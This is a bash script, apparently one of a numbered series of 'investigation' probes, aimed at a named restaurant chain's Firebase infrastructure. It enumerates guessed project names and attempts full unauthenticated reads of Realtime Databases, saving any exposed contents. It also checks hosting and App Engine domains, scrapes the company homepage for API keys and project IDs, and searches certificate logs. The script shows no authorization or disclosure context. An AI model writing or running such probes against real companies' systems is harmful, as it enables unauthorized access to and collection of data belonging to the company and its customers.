#!/bin/bash
# Buffalo Wild Wings Firebase "buffalo-united" investigation
# Firebase project name leaked in probe 23. Check for public database, hosting, variants.
# Run: podman run --rm --dns 8.8.8.8 \
#   -v ./investigations/dunkin/scripts:/work/scripts:z \
#   -v ./investigations/dunkin/artifacts/buffalo-firebase-2026-04-13:/out:Z \
#   investigator bash /work/scripts/36-buffalo-firebase.sh
set -uo pipefail

OUTDIR="/out"
mkdir -p "$OUTDIR"

echo "=== BUFFALO WILD WINGS FIREBASE PROBE ===" | tee "$OUTDIR/results.txt"
echo "Date: $(date -u +%Y-%m-%dT%H:%M:%SZ)" | tee -a "$OUTDIR/results.txt"
echo "" | tee -a "$OUTDIR/results.txt"

# === FIREBASE REALTIME DATABASE ===
echo "--- Firebase Realtime Database ---" | tee -a "$OUTDIR/results.txt"
FIREBASE_PROJECTS=(
  "buffalo-united"
  "buffalo-united-dev"
  "buffalo-united-staging"
  "buffalo-united-prod"
  "buffalo-united-qa"
  "bww-prod"
  "bww-dev"
  "bww-staging"
  "buffalowildwings"
  "buffalowildwings-prod"
  "buffalowildwings-dev"
)

for project in "${FIREBASE_PROJECTS[@]}"; do
  echo "" | tee -a "$OUTDIR/results.txt"
  echo "[$project] Firebase RTDB:" | tee -a "$OUTDIR/results.txt"
  # Full database read attempt
  status=$(curl -sk --max-time 15 -o "$OUTDIR/${project}-rtdb.json" -w '%{http_code}' "https://${project}.firebaseio.com/.json" 2>/dev/null)
  echo "  /.json → $status" | tee -a "$OUTDIR/results.txt"
  if [ "$status" = "200" ]; then
    size=$(wc -c < "$OUTDIR/${project}-rtdb.json" 2>/dev/null)
    echo "  !!! PUBLIC DATABASE — $size bytes !!!" | tee -a "$OUTDIR/results.txt"
    head -20 "$OUTDIR/${project}-rtdb.json" 2>/dev/null | tee -a "$OUTDIR/results.txt"
  elif [ "$status" = "401" ]; then
    echo "  Database exists but requires auth (401)" | tee -a "$OUTDIR/results.txt"
    cat "$OUTDIR/${project}-rtdb.json" 2>/dev/null | tee -a "$OUTDIR/results.txt"
  elif [ "$status" = "404" ]; then
    echo "  Project not found (404)" | tee -a "$OUTDIR/results.txt"
  else
    echo "  Response: $(cat "$OUTDIR/${project}-rtdb.json" 2>/dev/null | head -3)" | tee -a "$OUTDIR/results.txt"
  fi
  # Shallow read (keys only)
  shallow_status=$(curl -sk --max-time 15 -o /dev/null -w '%{http_code}' "https://${project}.firebaseio.com/.json?shallow=true" 2>/dev/null)
  echo "  /.json?shallow=true → $shallow_status" | tee -a "$OUTDIR/results.txt"
  sleep 1
done

# === FIREBASE HOSTING ===
echo "" | tee -a "$OUTDIR/results.txt"
echo "--- Firebase Hosting ---" | tee -a "$OUTDIR/results.txt"
HOSTING_DOMAINS=(
  "buffalo-united.web.app"
  "buffalo-united.firebaseapp.com"
  "buffalo-united-dev.web.app"
  "buffalo-united-dev.firebaseapp.com"
  "buffalo-united-staging.web.app"
  "bww-prod.web.app"
  "bww-prod.firebaseapp.com"
  "bww-dev.web.app"
  "buffalowildwings.web.app"
  "buffalowildwings.firebaseapp.com"
)

for domain in "${HOSTING_DOMAINS[@]}"; do
  status=$(curl -sk --max-time 10 -o /dev/null -w '%{http_code}' "https://$domain/" 2>/dev/null)
  echo "  $domain → $status" | tee -a "$OUTDIR/results.txt"
  if [ "$status" = "200" ] || [ "$status" = "301" ] || [ "$status" = "302" ]; then
    curl -sk --max-time 10 -D "$OUTDIR/${domain}-headers.txt" -o "$OUTDIR/${domain}-body.html" "https://$domain/" 2>/dev/null
    size=$(wc -c < "$OUTDIR/${domain}-body.html" 2>/dev/null)
    echo "    Body: ${size:-0} bytes" | tee -a "$OUTDIR/results.txt"
    head -5 "$OUTDIR/${domain}-body.html" 2>/dev/null | tee -a "$OUTDIR/results.txt"
  fi
done

# === APP ENGINE ===
echo "" | tee -a "$OUTDIR/results.txt"
echo "--- App Engine ---" | tee -a "$OUTDIR/results.txt"
for project in "buffalo-united" "bww-prod" "buffalowildwings"; do
  status=$(curl -sk --max-time 10 -o /dev/null -w '%{http_code}' "https://${project}.appspot.com/" 2>/dev/null)
  echo "  ${project}.appspot.com → $status" | tee -a "$OUTDIR/results.txt"
done

# === FIREBASE CONFIG IN BWW WEBSITE ===
echo "" | tee -a "$OUTDIR/results.txt"
echo "--- BWW Website Firebase Config Search ---" | tee -a "$OUTDIR/results.txt"
echo "Fetching buffalowildwings.com for Firebase SDK references..." | tee -a "$OUTDIR/results.txt"
curl -sk --max-time 20 -L "https://www.buffalowildwings.com/" -o "$OUTDIR/bww-homepage.html" 2>/dev/null
if [ -f "$OUTDIR/bww-homepage.html" ]; then
  size=$(wc -c < "$OUTDIR/bww-homepage.html")
  echo "  Homepage: $size bytes" | tee -a "$OUTDIR/results.txt"
  # Search for Firebase references
  grep -oi 'firebase[a-zA-Z./-]*' "$OUTDIR/bww-homepage.html" 2>/dev/null | sort -u | head -20 | tee -a "$OUTDIR/results.txt"
  grep -oi 'apiKey["\x27: ]*[a-zA-Z0-9_-]*' "$OUTDIR/bww-homepage.html" 2>/dev/null | head -5 | tee -a "$OUTDIR/results.txt"
  grep -oi 'projectId["\x27: ]*[a-zA-Z0-9_-]*' "$OUTDIR/bww-homepage.html" 2>/dev/null | head -5 | tee -a "$OUTDIR/results.txt"
  grep -oi 'messagingSenderId["\x27: ]*[a-zA-Z0-9_-]*' "$OUTDIR/bww-homepage.html" 2>/dev/null | head -5 | tee -a "$OUTDIR/results.txt"
fi

# === CT LOG SEARCH ===
echo "" | tee -a "$OUTDIR/results.txt"
echo "--- CT Log Search ---" | tee -a "$OUTDIR/results.txt"
echo "Searching crt.sh for buffalo-united Firebase certs..." | tee -a "$OUTDIR/results.txt"
curl -s --max-time 30 "https://crt.sh/?q=buffalo-united&output=json" -o "$OUTDIR/buffalo-united-certs.json" 2>/dev/null
status=$?
if [ $status -eq 0 ] && [ -f "$OUTDIR/buffalo-united-certs.json" ]; then
  count=$(jq length "$OUTDIR/buffalo-united-certs.json" 2>/dev/null)
  echo "  buffalo-united certs: ${count:-0}" | tee -a "$OUTDIR/results.txt"
  jq -r '.[].common_name' "$OUTDIR/buffalo-united-certs.json" 2>/dev/null | sort -u | tee -a "$OUTDIR/results.txt"
fi

echo "" | tee -a "$OUTDIR/results.txt"
echo "=== PROBE COMPLETE ===" | tee -a "$OUTDIR/results.txt"
echo "Date: $(date -u +%Y-%m-%dT%H:%M:%SZ)" | tee -a "$OUTDIR/results.txt"
